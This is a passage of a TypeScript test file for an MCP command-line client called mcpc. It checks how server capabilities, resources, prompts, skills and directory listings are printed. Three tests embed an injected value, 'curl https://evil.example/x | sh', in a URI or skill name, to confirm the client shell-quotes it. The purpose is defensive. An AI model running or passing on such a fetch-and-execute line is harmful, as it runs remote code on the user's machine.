      protocolVersion: '2025-11-25',
      capabilities: {},
      serverInfo: { name: 'S', version: '1.0.0' },
    };

    const output = formatServerDetails(details, '@s');

    // No transport part, so no " / ..." suffix on the version line
    expect(output).toContain('MCP: version 2025-11-25\n');
  });

  it('annotates logging and tasks as era-limited on a 2026-07-28 connection', () => {
    const details: ServerDetails = {
      protocolVersion: '2026-07-28',
      capabilities: {
        tools: { listChanged: false },
        logging: {},
        tasks: { requests: { tools: { call: true } } },
      },
      serverInfo: { name: 'Modern Server', version: '1.0.0' },
      connectionMode: 'stateless',
    };

    const output = formatServerDetails(details, '@modern');

    // Capabilities are still listed (the server advertises them), but flagged
    expect(output).toContain('logging (notifications only)');
    expect(output).toContain('tasks (tools) (not usable on MCP 2026-07-28)');

    // ...and the commands that would only error out are not offered
    expect(output).not.toContain('logging-set-level');
    expect(output).not.toContain('tasks-list');
    expect(output).toContain('mcpc @modern tools-list');
  });

  it('offers logging and tasks commands on a 2025-era connection', () => {
    const details: ServerDetails = {
      protocolVersion: '2025-11-25',
      capabilities: {
        logging: {},
        tasks: { requests: { tools: { call: true } } },
      },
      serverInfo: { name: 'Legacy Server', version: '1.0.0' },
    };

    const output = formatServerDetails(details, '@legacy');

    expect(output).toContain('* logging\n');
    expect(output).not.toContain('not usable on MCP');
    expect(output).toContain('mcpc @legacy logging-set-level');
    expect(output).toContain('mcpc @legacy tasks-list');
  });

  it('should format server info with minimal features', () => {
    const details: ServerDetails = {
      capabilities: {},
      serverInfo: { name: 'Minimal Server', version: '0.1.0' },
    };

    const output = formatServerDetails(details, 'https://example.com');

    // Should contain server version without protocol version
    expect(output).toContain('Server:');
    expect(output).toContain('Minimal Server (version: 0.1.0)');
    expect(output).not.toContain('MCP:');

    // Should show (none) for capabilities
    expect(output).toContain('Capabilities:');
    expect(output).toContain('(none)');

    // With no capabilities, no commands are listed
    expect(output).not.toContain('Available commands:');
    expect(output).not.toContain('tools-list');
    expect(output).not.toContain('resources-list');
    expect(output).not.toContain('prompts-list');

    // Should NOT contain instructions section (no instructions provided)
    expect(output).not.toContain('Instructions:');
  });

  it('should format server with only tools capability', () => {
    const details: ServerDetails = {
      capabilities: {
        tools: { listChanged: false },
      },
      serverInfo: { name: 'Tools Server', version: '1.0.0' },
    };

    const output = formatServerDetails(details, '@tools');

    // Should show tools as static
    expect(output).toContain('tools (static)');

    // Should show tools commands
    expect(output).toContain('mcpc @tools tools-list');
    expect(output).toContain('mcpc @tools tools-get');
    expect(output).toContain('mcpc @tools tools-call');

    // Should NOT show other commands
    expect(output).not.toContain('resources-list');
    expect(output).not.toContain('prompts-list');
    expect(output).not.toContain('logging-set-level');
  });

  it('should format server with resources capability (subscribe only)', () => {
    const details: ServerDetails = {
      capabilities: {
        resources: { subscribe: true, listChanged: false },
      },
      serverInfo: { name: 'Resource Server', version: '2.0.0' },
    };

    const output = formatServerDetails(details, '@res');

    // Should show resources with subscribe feature
    expect(output).toContain('resources (supports subscribe)');

    // Should show resources commands, including subscribe (capability present)
    expect(output).toContain('mcpc @res resources-list');
    expect(output).toContain('mcpc @res resources-read');
    expect(output).toContain('mcpc @res resources-subscribe <uri> <file>');
  });

  it('should not list completion-complete without the completions capability', () => {
    const details: ServerDetails = {
      protocolVersion: '2026-07-28',
      capabilities: { prompts: {} },
      serverInfo: { name: 'Test Server', version: '1.0.0' },
    };
    const output = formatServerDetails(details, '@test');
    expect(output).toContain('mcpc @test prompts-get');
    expect(output).not.toContain('completion-complete');
  });

  it('should not list resources-subscribe command without the subscribe capability', () => {
    const details: ServerDetails = {
      capabilities: {
        resources: { listChanged: true },
      },
      serverInfo: { name: 'Resource Server', version: '2.0.0' },
    };

    const output = formatServerDetails(details, '@res');

    expect(output).toContain('mcpc @res resources-read');
    expect(output).not.toContain('resources-subscribe');
  });

  it('should list active resource subscriptions with sync status', () => {
    const details: ServerDetails = {
      capabilities: { resources: { subscribe: true } },
      serverInfo: { name: 'Resource Server', version: '2.0.0' },
    };
    const subscriptions = [
      {
        uri: 'test://config',
        filePath: '/tmp/config.json',
        subscribedAt: new Date().toISOString(),
        lastSyncedAt: new Date().toISOString(),
      },
      {
        uri: 'test://broken',
        filePath: '/tmp/broken.json',
        subscribedAt: new Date().toISOString(),
        lastError: 'Re-subscribe failed: nope',
      },
    ];

    const output = formatServerDetails(details, '@res', undefined, subscriptions);

    expect(output).toContain('Resource subscriptions:');
    expect(output).toContain('test://config');
    expect(output).toContain('/tmp/config.json');
    expect(output).toContain('synced just now');
    expect(output).toContain('sync failing: Re-subscribe failed: nope');
  });

  it('should omit the resource subscriptions section when there are none', () => {
    const details: ServerDetails = {
      capabilities: { resources: { subscribe: true } },
      serverInfo: { name: 'Resource Server', version: '2.0.0' },
    };

    const output = formatServerDetails(details, '@res', undefined, []);

    expect(output).not.toContain('Resource subscriptions:');
  });

  it('should format empty instructions as no Instructions section', () => {
    const details: ServerDetails = {
      capabilities: { tools: {} },
      serverInfo: { name: 'No Instructions', version: '1.0.0' },
      instructions: '   ', // whitespace-only
    };

    const output = formatServerDetails(details, '@test');

    // Should NOT contain instructions section for whitespace-only
    expect(output).not.toContain('Instructions:');
  });

  it('should format instructions with leading/trailing whitespace trimmed', () => {
    const details: ServerDetails = {
      capabilities: {},
      serverInfo: { name: 'Test', version: '1.0.0' },
      instructions: '\n\n  Some instructions here.  \n\n',
    };

    const output = formatServerDetails(details, '@test');

    // Should contain trimmed instructions
    expect(output).toContain('Instructions:');
    expect(output).toContain('Some instructions here.');
    // Should be wrapped in code block
    expect(output).toContain('````');
  });

  it('should handle server details without serverInfo', () => {
    const details: ServerDetails = {
      capabilities: { prompts: { listChanged: true } },
    };

    const output = formatServerDetails(details, '@test');

    // Should NOT contain Server: line
    expect(output).not.toMatch(/^Server:/m);

    // Should still show capabilities and commands
    expect(output).toContain('Capabilities:');
    expect(output).toContain('prompts (dynamic list)');
    expect(output).toContain('prompts-list');
    expect(output).toContain('prompts-get');
  });

  it('surfaces the skills extension when a modern connection declares it', () => {
    const details: ServerDetails = {
      protocolVersion: '2026-07-28',
      capabilities: {
        resources: {},
        extensions: { 'io.modelcontextprotocol/skills': {} },
      } as ServerDetails['capabilities'],
      serverInfo: { name: 'Skills Server', version: '1.0.0' },
    };

    const output = formatServerDetails(details, '@skills');

    expect(output).toContain('* skills');
    expect(output).toContain('mcpc @skills skills-list');
    expect(output).toContain('mcpc @skills skills-get');
    // directoryRead defaults to false, so the directory command stays hidden
    expect(output).not.toContain('resources-directory-read');
  });

  it('surfaces the directory-read command only when the server declares it', () => {
    const details: ServerDetails = {
      protocolVersion: '2026-07-28',
      capabilities: {
        resources: {},
        extensions: { 'io.modelcontextprotocol/skills': { directoryRead: true } },
      } as ServerDetails['capabilities'],
      serverInfo: { name: 'Skills Server', version: '1.0.0' },
    };

    const output = formatServerDetails(details, '@skills');

    expect(output).toContain('skills (with directory reads)');
    expect(output).toContain('mcpc @skills resources-directory-read <uri>');
  });

  it('lists skills once, on the line carrying its settings', () => {
    // The skills line is written by the capability list itself, so the generic extension
    // list is told to skip it — otherwise the same extension appears twice.
    const details: ServerDetails = {
      protocolVersion: '2026-07-28',
      capabilities: {
        resources: {},
        extensions: {
          'io.modelcontextprotocol/skills': { directoryRead: true },
          'com.example/widgets': {},
        },
      } as ServerDetails['capabilities'],
      serverInfo: { name: 'Skills Server', version: '1.0.0' },
    };

    const output = formatServerDetails(details, '@skills');

    expect(output.match(/^\* skills/gm)).toHaveLength(1);
    expect(output).toContain('skills (with directory reads)');
    // The other declaration still goes through the generic list
    expect(output).toContain('com.example/widgets (unknown extension)');
  });

  it('annotates the extension but hides its commands on a legacy connection', () => {
    // The extension is specified against 2026-07-28 and later, so its commands would
    // only error out on a 2025-era connection.
    const details: ServerDetails = {
      protocolVersion: '2025-11-25',
      capabilities: {
        resources: {},
        extensions: { 'io.modelcontextprotocol/skills': {} },
      } as ServerDetails['capabilities'],
      serverInfo: { name: 'Legacy Skills', version: '1.0.0' },
    };

    const output = formatServerDetails(details, '@legacy');

    expect(output).toContain('skills (not usable on MCP 2025-11-25)');
    expect(output).not.toContain('skills-list');
  });

  it('does not surface skills when the extension is absent', () => {
    const details: ServerDetails = {
      protocolVersion: '2026-07-28',
      capabilities: {
        resources: {},
      },
      serverInfo: { name: 'Plain Server', version: '1.0.0' },
    };

    const output = formatServerDetails(details, '@plain');

    expect(output).not.toContain('skills-list');
    expect(output).not.toContain('skills-get');
  });

  it('does not surface skills when extensions is present but empty', () => {
    const details: ServerDetails = {
      protocolVersion: '2026-07-28',
      capabilities: {
        resources: {},
        extensions: {},
      } as ServerDetails['capabilities'],
      serverInfo: { name: 'Empty Ext', version: '1.0.0' },
    };

    const output = formatServerDetails(details, '@e');

    expect(output).not.toContain('skills');
  });

  it('ignores the extension when declared only under capabilities.experimental', () => {
    // `extensions` is where the spec puts extension declarations; `experimental` is a
    // different, unrelated capability field.
    const details: ServerDetails = {
      protocolVersion: '2026-07-28',
      capabilities: {
        resources: {},
        experimental: { 'io.modelcontextprotocol/skills': {} },
      } as ServerDetails['capabilities'],
      serverInfo: { name: 'Experimental Skills', version: '1.0.0' },
    };

    const output = formatServerDetails(details, '@exp');

    expect(output).not.toContain('skills-list');
  });

  it('names an advertised extension mcpc does not support, without offering commands', () => {
    const details: ServerDetails = {
      capabilities: {
        tools: {},
        extensions: { 'io.modelcontextprotocol/ui': { mimeTypes: ['text/html;profile=mcp-app'] } },
      } as ServerDetails['capabilities'],
      serverInfo: { name: 'Apps Server', version: '1.0.0' },
    };

    const output = formatServerDetails(details, '@apps');

    expect(output).toContain('MCP Apps (extension, not supported by mcpc)');
  });

  it('lists an unrecognized extension by its identifier', () => {
    const details: ServerDetails = {
      capabilities: {
        tools: {},
        extensions: { 'com.example/widgets': {} },
      } as ServerDetails['capabilities'],
      serverInfo: { name: 'Vendor Server', version: '1.0.0' },
    };

    const output = formatServerDetails(details, '@v');

    expect(output).toContain('com.example/widgets (unknown extension)');
  });

  it('does not report unrelated experimental capabilities as extensions', () => {
    const details: ServerDetails = {
      capabilities: {
        tools: {},
        experimental: { someVendorFlag: true },
      } as ServerDetails['capabilities'],
      serverInfo: { name: 'Experimental Server', version: '1.0.0' },
    };

    const output = formatServerDetails(details, '@x');

    expect(output).not.toContain('someVendorFlag');
    expect(output).not.toContain('unknown extension');
  });
});

describe('formatDiscoverResult', () => {
  const result = {
    supportedVersions: ['2026-07-28', '2025-11-25'],
    capabilities: { tools: { listChanged: true }, logging: {} },
    instructions: 'Server instructions.',
    _meta: {
      'io.modelcontextprotocol/serverInfo': { name: 'Modern Server', version: '2.0.0' },
    },
  } as Parameters<typeof formatDiscoverResult>[0];

  it('reports identity, every advertised version, capabilities and instructions', () => {
    const output = formatDiscoverResult(result, '@m', '2026-07-28');

    // Identity comes from the discover result's `_meta`, not from the handshake
    expect(output).toContain('Modern Server (version: 2.0.0)');
    expect(output).toContain('Supported protocol versions:');
    expect(output).toContain('2026-07-28');
    expect(output).toContain('2025-11-25');
    expect(output).toContain('tools (dynamic)');
    expect(output).toContain('Server instructions.');
    // Points at the session screen for the connection state and command inventory
    expect(output).toContain('mcpc @m');
  });

  it('shows the description and website URL from the advertised identity', () => {
    const described = {
      ...result,
      _meta: {
        'io.modelcontextprotocol/serverInfo': {
          name: 'Modern Server',
          version: '2.0.0',
          description: 'A server that describes itself.',
          websiteUrl: 'https://example.com/docs',
        },
      },
    } as Parameters<typeof formatDiscoverResult>[0];

    const output = formatDiscoverResult(described, '@m', '2026-07-28');

    expect(output).toContain('A server that describes itself.');
    expect(output).toContain('https://example.com/docs');
  });

  it('marks the version this session negotiated', () => {
    const output = formatDiscoverResult(result, '@m', '2026-07-28');
    expect(output).toMatch(/2026-07-28 \(negotiated\)/);
    expect(output).not.toMatch(/2025-11-25 \(negotiated\)/);
  });

  it('annotates logging as notifications-only on a modern connection', () => {
    // logging/setLevel is gone in 2026-07-28, so the capability must not read as usable
    const output = formatDiscoverResult(result, '@m', '2026-07-28');
    expect(output).toContain('logging (notifications only)');
  });

  it('shows extension metadata beyond the server identity', () => {
    const withMeta = {
      ...result,
      _meta: { ...result._meta, 'com.example/region': 'eu-central-1' },
    } as Parameters<typeof formatDiscoverResult>[0];

    const output = formatDiscoverResult(withMeta, '@m', '2026-07-28');

    expect(output).toContain('Metadata:');
    expect(output).toContain('com.example/region');
    expect(output).toContain('eu-central-1');
    // The identity is already shown as "Server:", so it is not repeated as metadata
    expect(output).not.toContain('io.modelcontextprotocol/serverInfo');
  });

  it('handles a server that advertises no capabilities and no instructions', () => {
    const bare = { supportedVersions: ['2026-07-28'], capabilities: {} } as Parameters<
      typeof formatDiscoverResult
    >[0];

    const output = formatDiscoverResult(bare, '@bare', '2026-07-28');

    expect(output).toContain('Capabilities:');
    expect(output).toContain('(none)');
    expect(output).not.toContain('Instructions:');
    expect(output).not.toContain('Metadata:');
  });
});

describe('formatResources', () => {
  it('should format resource list with header and summary', () => {
    const resources: Resource[] = [
      {
        uri: 'file:///home/user/data.json',
        name: 'User Data',
        description: 'User configuration file',
        mimeType: 'application/json',
      },
      {
        uri: 'https://api.example.com/config',
        name: 'Remote Config',
      },
    ];

    const output = formatResources(resources);

    // Should have header with count
    expect(output).toContain('Resources (2):');

    // Should have summary list
    expect(output).toContain('* `file:///home/user/data.json`');
    expect(output).toContain('* `https://api.example.com/config`');

    // Should have separators
    expect(output).toContain('---');

    // Should have detailed sections
    expect(output).toContain('Resource:');
  });

  it('should show empty list message for no resources', () => {
    const resources: Resource[] = [];
    const output = formatResources(resources);
    expect(output).toContain('Resources (0):');
  });
});

describe('formatResourceDetail', () => {
  it('should format resource with all fields', () => {
    const resource: Resource = {
      uri: 'file:///data/config.json',
      name: 'Configuration',
      description: 'Application configuration file',
      mimeType: 'application/json',
    };

    const output = formatResourceDetail(resource);

    // Should contain URI in backticks
    expect(output).toContain('Resource:');
    expect(output).toContain('`file:///data/config.json`');

    // Should contain name
    expect(output).toContain('Name:');
    expect(output).toContain('Configuration');

    // Should contain MIME type
    expect(output).toContain('MIME type:');
    expect(output).toContain('application/json');

    // Should contain description in code block
    expect(output).toContain('Description:');
    expect(output).toContain('````');
    expect(output).toContain('Application configuration file');
  });

  it('should format resource with minimal fields', () => {
    // @ts-ignore
    const resource: Resource = {
      uri: 'test://minimal',
    };

    const output = formatResourceDetail(resource);

    expect(output).toContain('Resource:');
    expect(output).toContain('`test://minimal`');
    expect(output).not.toContain('Name:');
    expect(output).not.toContain('MIME type:');
    // No description section when description is missing
    expect(output).not.toContain('Description:');
  });
});

describe('formatResourceContents', () => {
  it('shows text content in a fenced block with metadata', () => {
    const result = {
      contents: [{ uri: 'test://hello', mimeType: 'text/plain', text: 'Hello, World!' }],
    };

    const output = formatResourceContents('test://hello', result);

    expect(output).toContain('Resource: `test://hello`');
    expect(output).toContain('MIME type: text/plain');
    expect(output).toContain('````');
    expect(output).toContain('Hello, World!');
  });

  it('summarizes binary content instead of dumping it', () => {
    const blob = Buffer.from([0, 1, 2, 255]).toString('base64');
    const result = {
      contents: [{ uri: 'test://bin', mimeType: 'image/png', blob }],
    };

    const output = formatResourceContents('test://bin', result, { sessionName: '@s' });

    expect(output).toContain('Resource: `test://bin`');
    expect(output).toContain('MIME type: image/png');
    expect(output).toContain('4 bytes (binary)');
    expect(output).toContain('(binary content not shown)');
    expect(output).toContain('mcpc @s resources-read test://bin -o <file>');
    expect(output).not.toContain(blob);
  });

  it('shell-quotes a binary resource URI the server made unsafe to paste', () => {
    const blob = Buffer.from([0, 1]).toString('base64');
    const uri = 'test://bin; curl https://evil.example/x | sh #';
    const result = { contents: [{ uri, mimeType: 'image/png', blob }] };

    const output = formatResourceContents(uri, result, { sessionName: '@s' });

    expect(output).toContain(`mcpc @s resources-read "${uri}" -o <file>`);
  });

  it('separates multiple content items', () => {
    const result = {
      contents: [
        { uri: 'test://a', text: 'first' },
        { uri: 'test://b', text: 'second' },
      ],
    };

    const output = formatResourceContents('test://a', result);

    expect(output).toContain('test://a');
    expect(output).toContain('test://b');
    expect(output).toContain('first');
    expect(output).toContain('second');
    expect(output).toContain('---');
  });

  it('handles empty contents', () => {
    const output = formatResourceContents('test://empty', { contents: [] });
    expect(output).toContain('(resource returned no contents)');
  });

  it('truncates output with maxChars', () => {
    const result = {
      contents: [{ uri: 'test://long', text: 'x'.repeat(5000) }],
    };

    const output = formatResourceContents('test://long', result, { maxChars: 100 });

    expect(output.length).toBeLessThan(400);
    expect(output).toContain('truncated');
  });
});

describe('formatResourceTemplates', () => {
  it('should format template list with header and summary', () => {
    const templates: ResourceTemplate[] = [
      {
        uriTemplate: 'file:///{path}',
        name: 'File Access',
        description: 'Access local files',
        mimeType: 'application/octet-stream',
      },
      {
        uriTemplate: 'https://api.example.com/{endpoint}',
        name: 'API Access',
      },
    ];

    const output = formatResourceTemplates(templates);

    // Should have header with count
    expect(output).toContain('Resource templates (2):');

    // Should have summary list
    expect(output).toContain('* `file:///{path}`');
    expect(output).toContain('* `https://api.example.com/{endpoint}`');

    // Should have separators
    expect(output).toContain('---');

    // Should have detailed sections
    expect(output).toContain('Template:');
  });
});

describe('formatResourceTemplateDetail', () => {
  it('should format template with all fields', () => {
    const template: ResourceTemplate = {
      uriTemplate: 'test://file/{path}',
      name: 'File Template',
      description: 'Access files by path',
      mimeType: 'text/plain',
    };

    const output = formatResourceTemplateDetail(template);

    // Should contain URI template in backticks
    expect(output).toContain('Template:');
    expect(output).toContain('`test://file/{path}`');

    // Should contain name
    expect(output).toContain('Name:');
    expect(output).toContain('File Template');

    // Should contain MIME type
    expect(output).toContain('MIME type:');
    expect(output).toContain('text/plain');

    // Should contain description
    expect(output).toContain('Description:');
    expect(output).toContain('Access files by path');
  });
});

describe('formatPrompts', () => {
  it('should format prompt list with header and summary', () => {
    const prompts: Prompt[] = [
      {
        name: 'greeting',
        description: 'Generate a greeting',
        arguments: [{ name: 'name', description: 'Name to greet', required: true }],
      },
      {
        name: 'farewell',
        description: 'Generate a farewell',
      },
    ];

    const output = formatPrompts(prompts);

    // Should have header with count
    expect(output).toContain('Prompts (2):');

    // Should have summary list
    expect(output).toContain('* `greeting`');
    expect(output).toContain('* `farewell`');

    // Should have separators
    expect(output).toContain('---');

    // Should have detailed sections
    expect(output).toContain('Prompt:');
  });
});

describe('formatPromptDetail', () => {
  it('should format prompt with arguments', () => {
    const prompt: Prompt = {
      name: 'greeting',
      description: 'Generate a personalized greeting',
      arguments: [
        { name: 'name', description: 'Name to greet', required: true },
        { name: 'style', description: 'Greeting style', required: false },
      ],
    };

    const output = formatPromptDetail(prompt);

    // Should contain prompt name
    expect(output).toContain('Prompt:');
    expect(output).toContain('`greeting`');

    // Should contain arguments section
    expect(output).toContain('Arguments:');
    expect(output).toContain('`name`');
    expect(output).toContain('string');
    expect(output).toContain('[required]');
    expect(output).toContain('Name to greet');

    expect(output).toContain('`style`');
    expect(output).not.toMatch(/`style`.*\[required\]/);

    // Should contain description
    expect(output).toContain('Description:');
    expect(output).toContain('Generate a personalized greeting');
  });

  it('should format prompt with no arguments', () => {
    const prompt: Prompt = {
      name: 'simple',
      description: 'A simple prompt',
    };

    const output = formatPromptDetail(prompt);

    expect(output).toContain('Prompt:');
    expect(output).toContain('`simple`');
    expect(output).toContain('Arguments:');
    expect(output).toContain('(no arguments)');
    expect(output).toContain('Description:');
    expect(output).toContain('A simple prompt');
  });

  it('should format prompt with no description', () => {
    const prompt: Prompt = {
      name: 'undocumented',
    };

    const output = formatPromptDetail(prompt);

    expect(output).toContain('Prompt:');
    expect(output).toContain('`undocumented`');
    // No description section when description is missing
    expect(output).not.toContain('Description:');
  });

  it('should format prompt argument with required indicator in correct style', () => {
    const prompt: Prompt = {
      name: 'test',
      arguments: [
        { name: 'required_arg', required: true },
        { name: 'optional_arg', required: false },
      ],
    };

    const output = formatPromptDetail(prompt);

    // Required should show [required] in same format as tools
    expect(output).toContain('`required_arg`: string [required]');
    // Optional should NOT have [required]
    expect(output).toContain('`optional_arg`: string');
    expect(output).not.toMatch(/`optional_arg`.*\[required\]/);
  });
});

describe('formatSkills', () => {
  const skill = (
    name: string,
    description: string,
    uri: string,
    files: { uri: string; size: number }[] = [{ uri, size: 2314 }]
  ): Skill => ({
    uri,
    frontmatter: { name, description },
    resources: files.map((file) => ({ ...file, digest: `sha256:${'a'.repeat(64)}` })),
  });

  it('lists every skill with its description, URI and manifest summary', () => {
    const output = formatSkills(
      [
        skill('git-workflow', 'Helpers for Git workflows', 'skill://git-workflow/SKILL.md'),
        skill('refunds', 'Process refunds', 'skill://acme/billing/refunds/SKILL.md', [
          { uri: 'skill://acme/billing/refunds/SKILL.md', size: 1024 },
          { uri: 'skill://acme/billing/refunds/examples/email.md', size: 1024 },
        ]),
      ],
      '@test'
    );

    expect(output).toContain('Skills (2):');
    expect(output).toContain('git-workflow');
    expect(output).toContain('Helpers for Git workflows');
    expect(output).toContain('skill://acme/billing/refunds/SKILL.md');
    expect(output).toContain('(1 file, 2.3 KB)');
    expect(output).toContain('(2 files, 2.0 KB)');
    expect(output).toContain('mcpc @test skills-get');
    expect(output).toContain('--raw');
  });

  it('marks a dynamic skill as publishing no digests', () => {
    const entry = skill('daily', 'Live report', 'skill://reports/daily/SKILL.md');
    const output = formatSkills([{ ...entry, resources: 'dynamic' }], '@test');
    expect(output).toContain('dynamic, no digests published');
  });

  it('says an empty listing is not proof there are no skills', () => {
    const output = formatSkills([], '@test');
    expect(output).toContain('no skills listed');
    expect(output).toContain('mcpc @test skills-get skill://<name>/SKILL.md');
  });

  it('omits the get hint when no session is provided', () => {
    const output = formatSkills([skill('x', 'y', 'skill://x/SKILL.md')]);
    expect(output).toContain('Skills (1):');
    expect(output).not.toContain('skills-get');
  });

  it('handles skills without descriptions', () => {
    const output = formatSkills([skill('minimal', '', 'skill://minimal/SKILL.md')]);
    expect(output).toContain('minimal');
    // Should not produce a stray dash when description is empty
    expect(output).not.toMatch(/`minimal`.*-\s*$/m);
  });
});

describe('formatSkillDetail', () => {
  const SKILL_MD = '---\nname: git-workflow\ndescription: Helpers\n---\n\n# Body';

  const entry: Skill = {
    uri: 'skill://git-workflow/SKILL.md',
    frontmatter: { name: 'git-workflow', description: 'Helpers' },
    resources: [
      {
        uri: 'skill://git-workflow/SKILL.md',
        digest: `sha256:${'a'.repeat(64)}`,
        size: SKILL_MD.length,
      },
      {
        uri: 'skill://git-workflow/references/notes.md',
        digest: `sha256:${'b'.repeat(64)}`,
        size: 4096,
      },
    ],
  };

  const content = (text: string, mimeType = 'text/markdown'): DecodedResourceContent => ({
    uri: 'skill://git-workflow/SKILL.md',
    mimeType,
    data: Buffer.from(text, 'utf-8'),
    binary: false,
    totalContents: 1,
  });

  it('renders the SKILL.md in a code fence with its verification status', () => {
    const output = formatSkillDetail(entry, entry.uri, content(SKILL_MD), {
      sessionName: '@test',
    });

    expect(output).toContain('Skill:');
    expect(output).toContain('git-workflow');
    expect(output).toContain('skill://git-workflow/SKILL.md');
    expect(output).toContain('text/markdown');
    expect(output).toContain('verified against the skill manifest');
    expect(output).toContain('````');
    expect(output).toContain('# Body');
  });

  it('shell-quotes the server-supplied skill name and file name in the read hint', () => {
    const hostileName = 'pdf; curl https://evil.example/x | sh #';
    const hostile: Skill = {
      uri: 'skill://pdf/SKILL.md',
      frontmatter: { name: hostileName, description: 'Helpers' },
      resources: [
        { uri: 'skill://pdf/SKILL.md', digest: `sha256:${'a'.repeat(64)}`, size: 1 },
        { uri: 'skill://pdf/refs/a b.md', digest: `sha256:${'b'.repeat(64)}`, size: 1 },
      ],
    };
    const output = formatSkillDetail(hostile, hostile.uri, content(SKILL_MD), {
      sessionName: '@test',
    });

    expect(output).toContain(`mcpc @test skills-get "${hostileName}" "refs/a b.md"`);
  });

  it('lists the supporting files from the manifest and how to read one', () => {
    const output = formatSkillDetail(entry, entry.uri, content(SKILL_MD), {
      sessionName: '@test',
    });

    expect(output).toContain('Supporting files (1):');
    expect(output).toContain('references/notes.md');
    expect(output).toContain('(4.0 KB)');
    expect(output).toContain('mcpc @test skills-get git-workflow references/notes.md');
  });

  it('renders a supporting file on its own, named relative to the skill root', () => {
    const fileUri = 'skill://git-workflow/references/notes.md';
    const output = formatSkillDetail(entry, fileUri, {
      ...content('notes'),
      uri: fileUri,
    });

    expect(output).toContain('Skill file:');
    expect(output).toContain('references/notes.md');
    expect(output).toContain('(skill git-workflow)');
    expect(output).toContain('notes');
    expect(output).not.toContain('Supporting files');
  });

  it('says a dynamic skill is unverified rather than claiming verification', () => {
    const output = formatSkillDetail(
      { ...entry, resources: 'dynamic' },
      entry.uri,
      content(SKILL_MD)
    );
    expect(output).toContain('dynamic skill');
    expect(output).toContain('unverified');
  });

  it('summarizes binary content instead of dumping it', () => {
    const output = formatSkillDetail(
      entry,
      'skill://git-workflow/logo.png',
      {
        uri: 'skill://git-workflow/logo.png',
        mimeType: 'image/png',
        data: Buffer.from([0x89, 0x50, 0x4e, 0x47]),
        binary: true,
        totalContents: 1,
      },
      { sessionName: '@test' }
    );
    expect(output).toContain('binary content not shown');
    expect(output).toContain('resources-read skill://git-workflow/logo.png -o <file>');
  });

  it('truncates the body when maxChars is provided', () => {
    const output = formatSkillDetail(entry, entry.uri, content('A'.repeat(10000)), {
      maxChars: 200,
    });
    expect(output.length).toBeLessThan(500);
    expect(output).toContain('output truncated');
  });
});

describe('formatDirectoryChildren', () => {
  const children: Resource[] = [
    { uri: 'skill://pdf/templates/invoice.md', name: 'invoice.md', mimeType: 'text/markdown' },
    { uri: 'skill://pdf/templates/regional', name: 'regional', mimeType: 'inode/directory' },
  ];

  it('lists children and marks subdirectories', () => {
    const output = formatDirectoryChildren('skill://pdf/templates', children, '@test');

    expect(output).toContain('Directory skill://pdf/templates (2):');
    expect(output).toContain('invoice.md');
    expect(output).toContain('text/markdown');
    expect(output).toContain('regional');
    expect(output).toContain('skill://pdf/templates/regional');
  });

  it('points at the subdirectory to descend into', () => {
    const output = formatDirectoryChildren('skill://pdf/templates', children, '@test');
    expect(output).toContain('mcpc @test resources-directory-read skill://pdf/templates/regional');
  });

  it('shell-quotes a subdirectory URI the server made unsafe to paste', () => {
    const hostile: Resource = {
      uri: 'skill://pdf/templates/x; curl https://evil.example/x | sh #',
      name: 'x',
      mimeType: 'inode/directory',
    };
    const output = formatDirectoryChildren('skill://pdf/templates', [hostile], '@test');
    expect(output).toContain(
      'mcpc @test resources-directory-read "skill://pdf/templates/x; curl https://evil.example/x | sh #"'
    );
  });

  it('suggests reading a file when there is no subdirectory', () => {
    const output = formatDirectoryChildren('skill://pdf/templates', [children[0]!], '@test');
    expect(output).toContain('mcpc @test resources-read <uri>');
  });

  it('reports an empty directory', () => {
    const output = formatDirectoryChildren('skill://pdf/empty', [], '@test');
    expect(output).toContain('(empty)');
  });
});

describe('formatHuman with GetPromptResult', () => {
  it('should format single text message with backticks', () => {
    const result = {
      messages: [
        {
          role: 'user',
          content: { type: 'text', text: 'Hello, world!' },
        },
      ],
    };

    const output = formatHuman(result);

    expect(output).toContain('Messages (1):');
    expect(output).toContain('Role: user');
    expect(output).toContain('````');
    expect(output).toContain('Hello, world!');
  });

  it('should format multiple messages', () => {
    const result = {
      messages: [
        {
          role: 'user',
          content: { type: 'text', text: 'First message' },
        },
        {
          role: 'assistant',
          content: { type: 'text', text: 'Second message' },
        },
      ],
    };

    const output = formatHuman(result);

    expect(output).toContain('Messages (2):');
    expect(output).toContain('Role: user');
    expect(output).toContain('First message');
    expect(output).toContain('Role: assistant');
    expect(output).toContain('Second message');
  });

  it('should format image content', () => {
    const result = {
      messages: [
        {
          role: 'user',
          content: { type: 'image', data: 'base64data...', mimeType: 'image/png' },
        },
      ],
    };

    const output = formatHuman(result);

    expect(output).toContain('Messages (1):');
    expect(output).toContain('[Image: image/png]');
  });

  it('should format audio content', () => {
    const result = {
      messages: [
        {
          role: 'user',
          content: { type: 'audio', data: 'audiodata', mimeType: 'audio/mp3' },
        },
      ],
    };

    const output = formatHuman(result);

    expect(output).toContain('[Audio: audio/mp3]');
  });

  it('should format resource_link content', () => {
    const result = {
      messages: [
        {
          role: 'user',
          content: { type: 'resource_link', uri: 'file:///path/to/file.txt' },
        },
      ],
    };

    const output = formatHuman(result);

    expect(output).toContain('[Resource link: file:///path/to/file.txt]');
  });

  it('should format embedded resource content', () => {
    const result = {
      messages: [
        {
          role: 'user',
          content: {
            type: 'resource',
            resource: { uri: 'file:///data.json', text: 'embedded content' },
          },
        },
      ],
    };

    const output = formatHuman(result);

    expect(output).toContain('[Embedded resource: file:///data.json]');
    expect(output).toContain('embedded content');
  });

  it('should include description before messages', () => {
    const result = {
      messages: [
        {
          role: 'user',
          content: { type: 'text', text: 'Message text' },
        },
      ],
      description: 'This is a prompt description',
    };

    const output = formatHuman(result);

    expect(output).toContain('Description:');
    expect(output).toContain('This is a prompt description');
    // Description should come before Messages
    const descIndex = output.indexOf('Description:');
    const messagesIndex = output.indexOf('Messages (1):');
    expect(descIndex).toBeLessThan(messagesIndex);
  });

  it('should handle unknown content types gracefully', () => {
    const result = {
      messages: [
        {
          role: 'user',
          content: { type: 'unknown_type', data: 'some data' },
        },
      ],
    };

    const output = formatHuman(result);

    // Should fall back to JSON representation
    expect(output).toContain('Messages (1):');
    expect(output).toContain('unknown_type');
  });

  it('should NOT treat empty messages array as prompt result', () => {
    const result = {
      messages: [],
    };

    const output = formatHuman(result);

    // Should NOT show "Messages (0):" header since empty messages
    // falls back to generic object formatting
    expect(output).not.toContain('Messages (0):');
  });

  it('should NOT treat objects without role/content as prompt result', () => {
    const result = {
      messages: [{ id: 1, text: 'not a prompt message' }],
    };

    const output = formatHuman(result);

